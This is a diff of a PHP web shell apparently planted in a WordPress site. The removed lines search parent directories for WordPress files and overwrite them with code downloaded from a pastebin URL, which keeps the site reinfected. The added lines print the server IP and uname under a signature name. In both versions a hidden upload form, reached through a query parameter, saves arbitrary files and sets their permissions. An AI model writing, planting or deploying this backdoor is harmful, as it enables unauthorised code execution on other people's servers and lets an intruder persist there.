@@ -1,14 +1,10 @@
 <?php
-$Mr=array('/','../','../../','../../../','../../../../','../../../../../','../../../../../../');
-foreach($Mr as $pa){
-$Nobody=array("$pa/wp-content/plugins/hello.php","$pa/wp-content/index.php");
-foreach($Nobody as $path){
-if (file_exists("$path")){
-$html = @file_get_contents('https://pastebin.com/raw/5xG9rCz6');
-$save=fopen($path,'w');
-fwrite($save,$html);
-echo "";
-}}}
+error_reporting(0);
+echo "Frank Wix <br> Server IP : ";
+echo gethostbyname($_SERVER["HTTP_HOST"]);
+echo "<br> Uname : ";
+echo php_uname();
+echo "<br>";
 if($_GET['up']=="load"){
 if(isset($_POST['Submit'])){
 	$filedir = ""; 
@@ -20,7 +16,7 @@ if(isset($_POST['Submit'])){
 		$qx = $filedir.$userfile_name;
 		@move_uploaded_file($userfile_tmp, $qx);
 		@chmod ($qx, octdec($mode));
-echo" <a href=$userfile_name><center><b> $userfile_name uploaded</b></center></a>";
+echo" <a href=$userfile_name><center><b> $userfile_name</b></center></a>";
 }}
 else{
 echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
